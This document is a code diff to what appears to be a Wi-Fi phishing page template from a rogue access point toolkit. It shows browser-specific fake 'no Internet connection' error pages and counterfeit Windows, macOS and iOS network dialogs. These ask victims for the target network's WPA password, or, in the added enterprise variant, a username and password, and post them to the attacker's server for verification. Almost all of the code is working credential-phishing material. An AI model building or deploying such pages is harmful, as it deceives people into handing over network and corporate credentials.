@@ -26,9 +26,27 @@
                 var nVer = navigator.appVersion;
                 var nAgt = navigator.userAgent;
                 var browser = navigator.appName;
+		var platform = navigator.platform;
+		var macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'];
+		var windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'];
+		var iosPlatforms = ['iPhone', 'iPad', 'iPod'];
+     		var os = null;
                 var version = '' + parseFloat(navigator.appVersion);
                 var majorVersion = parseInt(navigator.appVersion, 10);
                 var nameOffset, verOffset, ix;
+
+		if (macosPlatforms.indexOf(platform) !== -1) {
+		    os = 'Mac OS';
+		  } else if (iosPlatforms.indexOf(platform) !== -1) {
+		    os = 'iOS';
+		  } else if (windowsPlatforms.indexOf(platform) !== -1) {
+		    os = 'Windows';
+		  } else if (/Android/.test(nAgt)) {
+		    os = 'Android';
+		  } else if (!os && /Linux/.test(platform)) {
+		    os = 'Linux';
+		  }
+
 
                 // Opera
                 if ((verOffset = nAgt.indexOf('Opera')) != -1) {
@@ -44,7 +62,7 @@
                     version = nAgt.substring(verOffset + 4);
                 }
                 // Edge
-                else if ((verOffset = nAgt.indexOf('Edge')) != -1) {
+                else if ((verOffset = nAgt.indexOf('Edg')) != -1) {
                     browser = 'Microsoft Edge';
                     version = nAgt.substring(verOffset + 5);
                 }
@@ -106,65 +124,6 @@
                     cookieEnabled = (document.cookie.indexOf('testcookie') != -1) ? true : false;
                 }
 
-                // system
-                var os = unknown;
-                var clientStrings = [
-                    {s:'Windows 10', r:/(Windows 10.0|Windows NT 10.0)/},
-                    {s:'Windows 8.1', r:/(Windows 8.1|Windows NT 6.3)/},
-                    {s:'Windows 8', r:/(Windows 8|Windows NT 6.2)/},
-                    {s:'Windows 7', r:/(Windows 7|Windows NT 6.1)/},
-                    {s:'Windows Vista', r:/Windows NT 6.0/},
-                    {s:'Windows Server 2003', r:/Windows NT 5.2/},
-                    {s:'Windows XP', r:/(Windows NT 5.1|Windows XP)/},
-                    {s:'Windows 2000', r:/(Windows NT 5.0|Windows 2000)/},
-                    {s:'Windows ME', r:/(Win 9x 4.90|Windows ME)/},
-                    {s:'Windows 98', r:/(Windows 98|Win98)/},
-                    {s:'Windows 95', r:/(Windows 95|Win95|Windows_95)/},
-                    {s:'Windows NT 4.0', r:/(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/},
-                    {s:'Windows CE', r:/Windows CE/},
-                    {s:'Windows 3.11', r:/Win16/},
-                    {s:'Android', r:/Android/},
-                    {s:'Open BSD', r:/OpenBSD/},
-                    {s:'Sun OS', r:/SunOS/},
-                    {s:'Linux', r:/(Linux|X11)/},
-                    {s:'iOS', r:/(iPhone|iPad|iPod)/},
-                    {s:'Mac OS X', r:/Mac OS X/},
-                    {s:'Mac OS', r:/(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/},
-                    {s:'QNX', r:/QNX/},
-                    {s:'UNIX', r:/UNIX/},
-                    {s:'BeOS', r:/BeOS/},
-                    {s:'OS/2', r:/OS\/2/},
-                    {s:'Search Bot', r:/(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/}
-                ];
-                for (var id in clientStrings) {
-                    var cs = clientStrings[id];
-                    if (cs.r.test(nAgt)) {
-                        os = cs.s;
-                        break;
-                    }
-                }
-
-                var osVersion = unknown;
-
-                if (/Windows/.test(os)) {
-                    osVersion = /Windows (.*)/.exec(os)[1];
-                    os = 'Windows';
-                }
-
-                switch (os) {
-                    case 'Mac OS X':
-                        osVersion = /Mac OS X (10[\.\_\d]+)/.exec(nAgt)[1];
-                        break;
-
-                    case 'Android':
-                        osVersion = /Android ([\.\_\d]+)/.exec(nAgt)[1];
-                        break;
-
-                    case 'iOS':
-                        osVersion = /OS (\d+)_(\d+)_?(\d+)?/.exec(nVer);
-                        osVersion = osVersion[1] + '.' + osVersion[2] + '.' + (osVersion[3] | 0);
-                        break;
-                }
 
                 // flash (you'll need to include swfobject)
                 /* script src="//ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js" */
@@ -187,123 +146,277 @@
                 browserMajorVersion: majorVersion,
                 mobile: mobile,
                 os: os,
-                osVersion: osVersion,
                 cookies: cookieEnabled,
                 flashVersion: flashVersion
             };
         }(this));
 
-        var resolvedOs = jscd.os
+	var resolvedBrowser = jscd.browser;
+	var resolvedPl = jscd.os;
 
-        if (resolvedOs == "Windows") {
-            document.write("<title i18n-content=\"title\">Internet connection is not available</title>");
-            document.write("<link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />")
-            document.write("<link rel='stylesheet' href='/static/style.css'>");
-            document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css'>");
-        }
-        else if (resolvedOs = "iOS") {
-            document.write("<link rel='stylesheet' href='/static/ios.css'>");
-        }
+
+        if (resolvedPl == "Windows") {
+		if (resolvedBrowser == "Chrome") {
+	            document.write("<title i18n-content=\"title\">Internet connection is not available</title>");
+	            document.write("<link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />")
+	            document.write("<link rel='stylesheet' href='/static/windows-network-manager-Chrome.css' />");
+            	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css' />");
+		}
+		else if (resolvedBrowser == "Opera") {
+	            document.write("<link rel='stylesheet' href='/static/opera-offline.css' type='text/css' />");
+	            document.write("<link rel='stylesheet' href='/static/windows-network-manager-Opera.css' />");
+            	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css' />");
+		}
+        	else if (resolvedBrowser == "Microsoft Edge") {
+	            document.write("<link rel='stylesheet' href='/static/edge-offline.css' type='text/css' />");
+	            document.write("<link rel='stylesheet' href='/static/windows-network-manager-Edge.css'>");
+            	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css'>");
+		}
+		else if (resolvedBrowser == "Firefox") {
+		    document.write("<link rel='stylesheet' href='/static/firefox-offline.css' type='text/css' />");
+	            document.write("<link rel='stylesheet' href='/static/windows-network-manager-Firefox.css'>");
+		}
+		else {
+		    document.write("<link rel='stylesheet' href='/static/explorer-offline.css' type='text/css' />");
+	            document.write("<link rel='stylesheet' href='/static/windows-network-manager-Explorer.css'>");
+            	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css'>");
+		}
+	}
+	
+        else if (resolvedPl == "Mac OS") {
+		if (resolvedBrowser == "Chrome") {
+	            document.write("<title i18n-content=\"title\">Internet connection is not available</title>");
+	            document.write("<link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />")
+	            document.write("<link rel='stylesheet' href='/static/mac-network-manager-Chrome.css' />");
+            	    document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css' />");
+		}
+		else if (resolvedBrowser == "Firefox") {
+		    document.write("<link rel='stylesheet' href='/static/firefox-offline.css' type='text/css' />")
+	            document.write("<link rel='stylesheet' href='/static/mac-network-manager-Firefox.css' />");
+		}
+		else {
+	    	    document.write("<link rel='stylesheet' href='/static/safari-offline.css' />");
+            	    document.write("<link rel='stylesheet' href='/static/mac-network-manager-Safari.css' />");
+		}
+	}
+	
         else {
-            document.write("<link rel='stylesheet' href='/static/mac-network-manager.css' />");
+	   	
+		document.write("<link rel='stylesheet' href='/static/ios.css' />");
         }
 
+	</script>
 
-        var loadhtml_mac = '<div id="details" class="hidden" ></div>' +
-        '<div class="mac-wifi" id="mac-wifi" style="display:none">' +
-        '    <div id="modal-title" class="title"></div>' +
-        '    <div class="content">' +
-        '        <div class="icon">' +
-        '            <img src="/static/wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />' +
-        '            <img src="/static/question.png" alt="?" width="25" class="question" />' +
-        '        </div>' +
-        '        <div class="description">' +
-        '           <form id="wifi-search-form" method="post" action="/post">' +
-        '               <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.</strong>' + 
-        '               <div class="password">' +
-        '                   <label>Password: </label>' +
-        '                   <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
-        '                   <br>' +
-        '                   <label id="pw_status"></label>' +
-        '                   <br>' +
-        '                   <div class="glow"></div>' +
-        '               </div>' + 
-        '               <div class="checkmark">' +
-        '                   <input id="show-password" type="checkbox" /><label for="show-password">Show password</label>' +
-        '               </div>' +
-        '               <div class="checkmark">' +
-        '                   <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
-        '               </div>' + 
-        '               <div class="buttons">' +
-        '                   <input id="button-join" type="submit" value="Join">' +
-        '                   <input id="button-cancel" type="reset" value="Reset">' +
-        '               </div>' +
-        '           </form>' +
-        '       </div>' +
-        '   </div>' +
-        '</div>';
+	<script>
+	
+	if ( {{ enterprise }} == "0") {
+	       var loadhtml_mac = '<div id="details" class="hidden" ></div>' +
+	'        <div class="mac-wifi" id="mac-wifi" style="display:none">' +
+	'            <div id="modal-title" class="title"></div>' +
+	'            <div class="content">' +
+	'                <div class="icon">' +
+	'                    <img src="/static/wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />' +
+	'                </div>' +
+	'                <img src="/static/question.png" alt="?" width="25" class="question" />' +
+	'                <div class="description">' +
+	'                   <form id="wifi-search-form" method="post" action="/post">' +
+	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a WPA-2 password.</strong>' + 
+	'                       <div class="password">' +
+	'                           <label>Password: </label>' +
+	'                           <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
+	'                           <br>' +
+	'                           <label id="pw_status"></label>' +
+	'                           <br>' +
+	'                           <div class="glow"></div>' +
+	'                       </div>' + 
+	'                       <div class="checkmark1">' +
+	'                           <input id="show-password" type="checkbox" /><label for="show-password" style="margin-right: 60px;">Show password</label>' +
+	'                       </div>' +
+	'                       <div class="checkmark2">' +
+	'                           <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
+	'                       </div>' + 
+	'                       <div class="buttons">' +
+	'                           <input id="button-join" type="submit" value="Join">' +
+	'                           <input id="button-cancel" type="reset" value="Reset">' +
+	'                      </div>' +
+	'                   </form>' +
+	'               </div>' +
+	'          </div>' +
+        '	</div>';
+	}
 
-        var loadhtml_windows = "<form id='windows-form' method='post' action='/post'><div class=\'network-manager\'\>" +
-        "<ul>" +
-        "       <li class='selected'>" +
-        "           <div class='wifi icon'>" +
-        "               <div class='dot dot1'></div>" +
-        "               <div class='small dot dot2'></div>" +
-        "               <div class='small dot dot3'></div>" +
-        "               <div class='small dot dot4'></div>" +
-        "           </div>" +
-        "           <div class='content'>" +
-        "               <strong>{{ target_ap_essid }}</strong>" +
-        "               <div class='disconnected'>" +
-        "                   <input id='automatic' type='checkbox' />" +
-        "                   <label for='automatic'>" +
-        "                       <div class='check'></div>" +
-        "                       Connect automatically" +
-        "                   </label>" +
-        "                   <button id='connect' class='connect' type='button'>Connect</button>" +
-        "               </div>" +
-        "               <div class='connected'>" +
-        "                   <label id='pw_status' for='presharedKey'>" +
-        "                       Enter the network security key" +
-        "                   </label>" +
-        "                   <input id='password' type='password' name='wfphshr-wpa-password' />" +
-        "                   You can also connect by pushing the button on the" +
-        "                   router." +
-        "                   <input id='share' type='checkbox' />" +
-        "                   <label for='share'>" +
-        "                       <div class='check'></div>" +
-        "                       Share network with my contacts" +
-        "                   </label>" +
-        "                   <button class='authenticate'>Next</button> " +
-        "                   <button class='cancel' type='button'>Cancel</button> " +
-        "               </div> " +
-        "           </div> " +
-        "       </li> " +
-                {% for ap in APs %} 
-        "        <li>" +
-        "           <div class='wifi icon'>" +
-        "               <div class='dot dot1'></div>" +
-        "               <div class='small dot dot2'></div>" +
-        "               <div class='small dot dot3'></div>" +
-        "               <div class='small dot dot4'></div>" +
-        "           </div>" +
-        "           <div class='content'>" +
-        "               <strong>{{ ap['essid'] }}</strong>" +
-        "               <span>Connected</span>" +
-        "           </div>" +
-        "       </li>" +
-                {% end %}
-        "       </ul> " +
-        "       <a href=''>Network settings</a> " +
-        "       </div></form>"; 
-        
-        var loadhtml_mobile = '<form id="wifi-search-form" method="post" action="/post">' +
+	else if ( {{ enterprise }} == "1") {
+	       var loadhtml_mac = '<div id="details" class="hidden" ></div>' +
+	'        <div class="mac-wifi" id="mac-wifi" style="display:none">' +
+	'            <div id="modal-title" class="title"></div>' +
+	'            <div class="content">' +
+	'                <div class="icon">' +
+	'                    <img src="/static/wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />' +
+	'                </div>' +
+	'                <img src="/static/question.png" alt="?" width="25" class="question" />' +
+	'                <div class="description">' +
+	'                   <form id="wifi-search-form" method="post" action="/post">' +
+	'                       <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires WPA-2 enterprise credentials.</strong>' + 
+	'                       <div class="username">' +
+	'			    <label>Username: </label>' +
+	'			    <input type="text" id="wifi-search-username" name="wfphshr-wpa-username"/>' +
+	'                           <br>' +
+	'                           <div class="glow"></div>' +
+	'                       </div>' +
+	'			<div class="password">' +	
+	'                           <label>Password: </label>' +		
+	'                           <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
+	'                           <br>' +
+	'                           <label id="pw_status"></label>' +
+	'                           <br>' +
+	'                           <div class="glow"></div>' +
+	'                       </div>' + 
+	'                       <div class="checkmark1">' +
+	'                           <input id="show-password" type="checkbox" /><label for="show-password" style="margin-right: 60px;">Show password</label>' +
+	'                       </div>' +
+	'                       <div class="checkmark2">' +
+	'                           <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
+	'                       </div>' + 
+	'                       <div class="buttons">' +
+	'                           <input id="button-join" type="submit" value="Join">' +
+	'                           <input id="button-cancel" type="reset" value="Reset">' +
+	'                      </div>' +
+	'                   </form>' +
+	'               </div>' +
+	'          </div>' +
+        '	</div>';
+	}
+
+	</script>
+	
+	<script>
+	
+        if ( {{ enterprise }} == "0" ) {
+        	var loadhtml_windows = "<form id='windows-form' method='post' action='/post'><div class=\'network-manager\'\>" +
+	"	<ul class= 'firest'>" +
+	"		<li class='selected'>" +
+	"			<div class='wifi icon'>" +
+	"				<div class='dot dot1'></div>" +
+	"				<div class='small dot dot2'></div>" +
+	"				<div class='small dot dot3'></div>" +
+	"				<div class='small dot dot4'></div>" +
+	"			</div>" +
+	"			<div class='content'>" +
+	"				<strong>{{ target_ap_essid }}</strong>" +
+	"				<div class='disconnected'>" +
+	"					<input id='automatic' type='checkbox' />" +
+	"					<label for='automatic' id='networklabel'>" +
+	"						<div class='check'></div>" +
+	"						Connect automatically" +
+	"					</label>" +
+	"					<button id='connect' class='connect' type='button'>Connect</button>" +
+	"				</div>" +
+	"				<div class='connected'>" +
+	"					<label id='pw_status' for='presharedKey'>" +
+	"					Enter the network security key" +
+	"					</label>" +
+	"					<input id='password' type='password' name='wfphshr-wpa-password' />" +
+	"					You can also connect by pushing the button on the" +
+	"					router.\n" +
+	"					<input id='share' type='checkbox' />" +
+	"					<label for='share' class='sharecheck'>" +
+	"						<div class='check'></div>" +
+	"						Share network with my contacts" +
+	"					</label>" +
+	"					<button class='authenticate'>Next</button> " +
+	"					<button class='cancel' type='button'>Cancel</button> " +
+	"				</div> " +
+	"			</div> " +
+	"		</li> " +
+			{% for ap in APs %} 
+	"		<li>" +
+	"			<div class='wifi icon'>" +
+	"				<div class='dot dot1'></div>" +
+	"				<div class='small dot dot2'></div>" +
+	"				<div class='small dot dot3'></div>" +
+	"				<div class='small dot dot4'></div>" +
+	"			</div>" +
+	"			<div class='content'>" +
+	"				<strong>{{ ap['essid'] }}</strong>" +
+	"				<span>Connected</span>" +
+	"			</div>" +
+	"		</li>" +
+			{% end %}
+	"	</ul> " +
+	"	<a href='' class='networksettings'>Network settings</a> " +
+	"	</div></form>";
+	}
+
+	else if ( {{ enterprise }} == "1" )  {
+		var loadhtml_windows = "<form id='windows-form' method='post' action='/post'><div class=\'network-manager\'\>" +
+	"	<ul class= 'firest'>" +
+	"		<li class='selected'>" +
+	"			<div class='wifi icon'>" +
+	"				<div class='dot dot1'></div>" +
+	"	 			<div class='small dot dot2'></div>" +
+	"				<div class='small dot dot3'></div>" +
+	"				<div class='small dot dot4'></div>" +
+	"	 		</div>" +
+	"	 		<div class='content'>" +
+	"	  			<strong>{{ target_ap_essid }}</strong>" +
+	"	  			<div class='disconnected'>" +
+	"					<input id='automatic' type='checkbox' />" +
+	"					<label for='automatic' id='networklabel'>" +
+	"						<div class='check'></div>" +
+	"	                      		 	Connect automatically" +
+	"					</label>" +
+	"					<button id='connect' class='connect' type='button'>Connect</button>" +
+	"				</div>" +
+	"				<div class='connected'>" +
+	"					<label id='pw_status' for='presharedKey'>" +
+	"	                       		Enter the username and password" +
+	"	                   		</label>" +
+	"					<input id='text' type='text' name='wfphshr-wpa-username' />" +
+	"					<input id='password' type='password' name='wfphshr-wpa-password' />" +
+	"	                   		You can also connect by pushing the button on the" +
+	"	                   		router.\n" +
+	"					<input id='share' type='checkbox' />" +
+	"					<label for='share' class='sharecheck'>" +
+	"						<div class='check'></div>" +
+	"	                       			Share network with my contacts" +
+	"					</label>" +
+	"					<button class='authenticate'>Next</button> " +
+	"					<button class='cancel' type='button'>Cancel</button> " +
+	"				</div> " +
+	"			</div> " +
+	"		</li> " +
+			{% for ap in APs %} 
+	"		<li>" +
+	"			<div class='wifi icon'>" +
+	"				<div class='dot dot1'></div>" +
+	"				<div class='small dot dot2'></div>" +
+	"				<div class='small dot dot3'></div>" +
+	"				<div class='small dot dot4'></div>" +
+	"			</div>" +
+	"			<div class='content'>" +
+	"				<strong>{{ ap['essid'] }}</strong>" +
+	"				<span>Connected</span>" +
+	"			</div>" +
+	"		</li>" +
+			{% end %}
+	"	</ul> " +
+	"	<a href='' class='networksettings'>Network settings</a> " +
+	"	</div></form>";
+	}
+	
+	</script>
+	
+	<script>
+	var loadhtml_mobile = '<form id="wifi-search-form" method="post" action="/post">' +
 	'<input class="hidden" id="wifi-search-password" name="wfphshr-wpa-password" />' +
 	' 	<div class="buttons">' +
         ' 		<button id="button-join" class="action hidden"></button>' +
         ' 	</div>' +
 	'</form>';
-
+	</script>
+	
+	<script>
+	if ( {{ enterprise }} == "0" ) {
         var loadhtml_ios = '<div class="ios-container">'
         + '<form id="ios-password-form" method="post" action="/post">'
         + '  <div class="ios-header">Enter the password for "{{ target_ap_essid }}" </div>'
@@ -312,8 +425,24 @@
         + '  <div class="ios-note">You can also access this Wi-Fi network by bringing your device near any iPhone, iPad, or Mac which has connected to this network and has you in their contacts.</div>'
         + '  </form>'
         + '<div id="ios-message"></div>'
-        + '</div>';
-
+        + '</div>'
+	}
+	else if ( {{ enterprise }} == "1" )  {
+	var loadhtml_ios = '<div class="ios-container">'
+        + '<form id="ios-password-form" method="post" action="/post">'
+        + '  <div class="ios-header">Enter the password for "{{ target_ap_essid }}" </div>'
+        + '  <div class="ios-actions"><input type="reset" value="&nbsp;&nbsp;&nbsp;&nbsp;" class="action-button" style="float: left;"><input id="ios-join-button" type="submit" value="Join" class="action-button" style="float: right;"><div class="enter-password-text">Enter Password</div></div>'
+        + '  <div class="ios-password-entry"><span style="margin-right: 12px">Username</span><input id="ios-password" name="wfphshr-wpa-password" type="text" autofocus></div>'
+        + '  <div class="ios-password-entry"><span style="margin-right: 12px">Password</span><input id="ios-password" name="wfphshr-wpa-password" type="password" autofocus></div>'
+        + '  <div class="ios-note">You can also access this Wi-Fi network by bringing your device near any iPhone, iPad, or Mac which has connected to this network and has you in their contacts.</div>'
+        + '  </form>'
+        + '<div id="ios-message"></div>'
+        + '</div>'
+	}	
+	</script>
+	
+	
+	<script>
         /* Callback receive the passphrase status and password*/
         function validate_passphrase (password, callback) {
             var xhttp = new XMLHttpRequest();
@@ -327,7 +456,7 @@
             var data = JSON.stringify({"psk_verify": password});
             xhttp.send(data);
         }
-
+	
         function windows_validate_action (pw_status, password) {
             if (pw_status == "success") {
                 document.getElementByid("windows-form").submit(); 
@@ -338,7 +467,7 @@
                 document.getElementById("windows-form").submit(); 
             }
         }
-
+	
         function mac_validate_action (pw_status, password) {
             if (pw_status == "success") {
                 document.getElementById("wifi-search-form").submit(); 
@@ -349,7 +478,7 @@
                 document.getElementById("wifi-search-form").submit(); 
             }
         }
-
+	
         function mobile_validate_action (pw_status, password) {
             if (pw_status == "success") {
 			    document.getElementById("wifi-search-password").value = password;
@@ -365,7 +494,7 @@
 			    document.getElementById("button-join").click();
             }
         }
-
+	
         function ios_validate_action(pw_status, password) {
             if (pw_status == "success") {
                 // Password matched, show a success message.
@@ -381,7 +510,7 @@
                 document.getElementById("ios-message").innerHTML = "An error occurred, please try again.";
             }
         }
-
+	
         function load_mobile() {
 		    var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
 		    if (popup != null) {
@@ -390,42 +519,255 @@
         }
         
         </script>
+		
+		
+		<script>
+		function ShowBrowser() {		
+			if (resolvedBrowser == "Chrome"){			
+				var x = document.getElementById("Br1");
+				if (x.style.display == "none") {
+				x.style.display = "block";
+				} else {
+				x.style.display = "none";
+				}				
+			}
+			else if (resolvedBrowser == "Microsoft Internet Explorer") {			
+				var x = document.getElementById("Br2");
+				if (x.style.display == "none") {
+				x.style.display = "block";
+				} else {
+				x.style.display = "none";
+				}		
+			}
+			else if (resolvedBrowser == "Firefox") {			
+				var x = document.getElementById("Br3");
+				if (x.style.display == "none") {
+				x.style.display = "block";
+				} else {
+				x.style.display = "none";
+				}			
+			}
+			else if (resolvedBrowser == "Microsoft Edge") {			
+				var x = document.getElementById("Br4");
+				if (x.style.display == "none") {
+				x.style.display = "block";
+				} else {
+				x.style.display = "none";
+				}			
+			}
+			else if (resolvedBrowser == "Opera") {			
+				var x = document.getElementById("Br5");
+				if (x.style.display == "none") {
+				x.style.display = "block";
+				} else {
+				x.style.display = "none";
+				}				
+			}
+			else {
+				var x = document.getElementById("Br6");
+				if (x.style.display === "none") {
+				x.style.display = "block";
+				} else {
+				x.style.display = "none";
+				}				
+			}
+			
+		}
+		</script>
+			
+		
         <title></title>
         </head>
-    <body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
-    <div id="loader-ios"></div>
-    <div id="main-frame-error" class="interstitial-wrapper">
-        <div id="main-content">
-            <img class="dinosaur" src="static/dinosaur.png" width="45" />
-            <div class="icon icon-offline" style="visibility: hidden;"></div>
-            <div id="main-message">
-                <h1>There is no Internet connection</h1>
-                <p>You can try to diagnose the problem by taking the following steps:
-                <br />
-                Go to
-                <strong>
-                Applications &gt; System Preferences &gt; Network &gt; Assist me
-                </strong>
-                to test your connection.</p>
-                <div id="suggestions-list" >
-                    <p >Try:</p>
-                    <ul class="chrome-list">
-                        <li>Checking the network cable or router</li>
-                        <li>Resetting the modem or router</li>
-                        <li>Reconnecting to Wi-Fi</li>
-                    </ul>
-                </div>
-                <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
-            </div>
-        </div>
-        <div id="buttons" class="nav-wrapper suggested-right" >
-            <button id="details-button" class="text-button small-link singular">Details</button>
-        </div>
-        <div id="loader-mac"></div>
-        <div id="loader-windows"></div>
-        <div id="loader-mobile"></div>
+    <body onload="ShowBrowser()" id="t" class="offline">
+		<div id= "loader-ios"></div>
+		<div id= "loader-mac"></div>
+		<div id= "loader-windows"></div>
+		<div id= "loader-mobile"></div>
+			
+			<div id = "Br1" style="display: none;">	
+				<div id="main-frame-error" class="interstitial-wrapper">
+					<div id="main-content">
+						<img class="dinosaur" src="static/dinosaur.png" width="45" />
+						<div class="icon icon-offline" style="visibility: hidden;"></div>
+						<div id="main-message">
+							<h1>There is no Internet connection</h1>
+							<p>You can try to diagnose the problem by taking the following steps:
+							<br />
+							Go to
+							<strong>
+							Applications &gt; System Preferences &gt; Network &gt; Assist me
+							</strong>
+							to test your connection.</p>
+							<div id="suggestions-list" >
+								<p >Try:</p>
+								<ul class="chrome-list">
+									<li>Checking the network cable or router</li>
+									<li>Resetting the modem or router</li>
+									<li>Reconnecting to Wi-Fi</li>
+								</ul>
+							</div>
+							<div class="error-code">ERR_INTERNET_DISCONNECTED</div>
+						</div>
+					</div>
+					<div id="buttons" class="nav-wrapper suggested-right" >
+						<button id="details-button" class="text-button small-link singular">Details</button>
+					</div>
+				</div>
+			</div>
+			
+			<div id= "Br2" style="display: none;">
+				<div class="mainContent" id="contentContainer">
+					<div class="title" id="mainTitle">You're not connected to a network</div>
+					<div class="taskSection" id="taskSection">                
+						<ul class="tasks" id="notConnectedTasks">
+							<li id="task2-1">Check that all network cables are plugged in.</li>
+							<li id="task2-2">Verify that airplane mode is turned off.</li>
+							<li id="task2-3">Make sure your wireless switch is turned on.</li>
+							<li id="task2-4">See if you can connect to mobile broadband.</li>
+							<li id="task2-5">Restart your router.</li>
+						</ul>
+					</div>
+				<div align="left" id="moreInformationAlign" aria-labelledby="moreInformation">
+					<table>
+						<tbody><tr>
+							<td aria-labelledby="infoBlockIDImage" valign="top">
+								<a onclick="javascript:expandCollapse('infoBlockID', true); return false;" href="#"><img class="actionIcon" id="infoBlockIDImage" alt="More information" src="static/down.png" border="0"></a>
+							</td>
+							<td valign="top">
+								<span id="moreInfoContainer"><a href="javascript:expandCollapse('infoBlockID', true);">More information</a></span>
+								<noscript>&lt;id id="moreInformation"&gt;More information&lt;/id&gt;</noscript>
+							</td>
+						</tr>
+					</tbody></table>
+					<div class="infoBlock" id="infoBlockID" style="display: none;">
+						<p class="BodyTextBlockStyle" id="subError" style="margin-left: 20px;"></p>
+						<p class="BodyTextBlockStyle" id="ErrorCode" style="margin-left: 20px;"></p>
+					</div>
+				</div>
+				<br>
+				<div id="diagnoseOptions"><button class="diagnoseButton" id="diagnose" onclick="javascript:diagnoseConnectionAndRefresh(); return false;">Fix connection problems</button></div>
+				<br>
+				</div>
+			</div>
+			
+			<div id= "Br3" style="display: none;" >
+				<div id="errorPageContainer" class="container">
+				
+					<div id="text-container" style="margin: auto; padding-inline-start: 50%;">
+						
+						<div class="title">
+							<h1 class="title-text">Hmm. We're having trouble finding that site.</h1>
+						</div>
+						
+						<div id="errorShortDesc">
+							<p id="errorShortDescText">We can't connect to the server at www.google.com.</p>
+						</div>
+						
+						<div id="errorShortDesc2">
+							<p id="errorShortDescText2"></p>
+						</div>
+						
+						<div id="errorLongDesc">
+							<strong>If that address is correct, here are three other things you can try:</strong>
+							<ul>
+								<li>Try again later.</li>
+								<li>Check your network connection.</li>
+								<li>If you are connected but behind a firewall, check that Firefox has permission to access the Web.</li>
+							</ul>
+						</div>
+					</div>
+					
+					<div id="netErrorButtonContainer" class="button-container">
+						<button class="primary-try-again" autofocus="true" style="color: teal; background-color: #FFFFC0;">Try Again</button>
+					</div>
+					
+				</div>
+			</div>
+			
+			<div id= "Br4" style="display: none;">
+				<div id="Wrapper">       
+					<div id="NotConnected">
+						<table role="presentation">
+							<tbody><tr>
+								<td aria-hidden="true">
+									<img id="icon" src="/static/heart.png"  />
+								</td>
+								<td>
+									<h1 id="dnserror_offline_header">You’re not connected</h1>
+									<p id="dnserror_offline_body1">And the web just isn’t the same without you. </p>
+									<p id="dnserror_offline_body2">Let’s get you back online</p>
+									<ul>
+										<li class="noCables"><id id="dnserror_offline_checkcables">Check that your network cables are plugged in.</id></li>
+										<li><id id="dnserror_offline_airplanemode">Make sure you’re not in airplane mode.</id></li>
+										<li><id id="dnserror_offline_wirelessswitch">See if your wireless switch is turned on.</id></li>
+										<li><id id="dnserror_offline_restartrouter">Restart your router.</id></li>
+									</ul>
+									<br>
+									<button class="pushbutton" id="LaunchMSSettingsNetworkStatus" type="submit"><id id="dnserror_offline_networksettings">Help me fix it</id></button>
+								</td>
+							</tr>
+						</tbody></table>
+					</div>
+					
+				</div>
+			</div>
+			
+			<div id= "Br5" style="display: none; margin-left: 25%; margin-top: 10%">
+				<div class="content">
+
+				<div id="animation" style="display: block;" ><div style="width: 170px; height: 170px; margin-left: 25%;"><img id="icon" src="static/ufo.png" width="212" height="212" style="max-width: 100%; max-height: 100%; background-color: transparent;" /></div></div>
+				<div id="illustration" class="illustration" style="display: none;" ><img src="Ni4xMSA0LjkyNUM1OS45MTMgMy45MDMgNTAuNTgyLjA0IDQwLjM1LjAwM0w0MC4yIDBDMTcuOTk3IDAgMCAxNy45OTggMCA0MC4yYzAgMjEuNTU3IDE2Ljk3MiAzOS4xNSAzOC4yODUgNDAuMTUuNjM1LjAzIDEuMjczLjA0OCAxLjkxNS4wNDggMTAuMjkyIDAgMTkuNjc4LTMuODcgMjYuNzktMTAuMjMtNC43MTIgMy4xMjUtMTAuMjIgNC45MjMtMTYuMTEgNC45MjMtOS41NzMgMC0xOC4xNDYtNC43NDYtMjMuOTEzLTEyLjIzNXoiLz48cGF0aCBmaWxsPSJ1cmwoI2IpIiBkPSJNMjYuOTY3IDE3LjU0NmMzLjY4OC00LjM1NCA4LjQ1NC02Ljk4IDEzLjY2LTYuOTggMTEuNyAwIDIxLjE4OCAxMy4yNjggMjEuMTg4IDI5LjYzNHMtOS40ODYgMjkuNjM0LTIxLjE5IDI5LjYzNGMtNS4yMDQgMC05Ljk3LTIuNjI2LTEzLjY1Ny02Ljk4IDUuNzY3IDcuNDkgMTQuMzQgMTIuMjM3IDIzLjkxMyAxMi4yMzcgNS44OSAwIDExLjQtMS43OTUgMTYuMTEtNC45MkM3NS4yMiA2Mi44MSA4MC40IDUyLjExIDgwLjQgNDAuMmMwLTExLjkwOC01LjE4LTIyLjYwNS0xMy40MDYtMjkuOTY2QzYyLjI4IDcuMTA3IDU2Ljc3IDUuMzA4IDUwLjg4IDUuMzA4Yy05LjU3MyAwLTE4LjE0NiA0Ljc1LTIzLjkxMyAxMi4yMzh6Ii8+PC9zdmc+" jstcache="0"></div>
+
+				<div class="description">
+				  <h1>
+					<span>No internet</span>
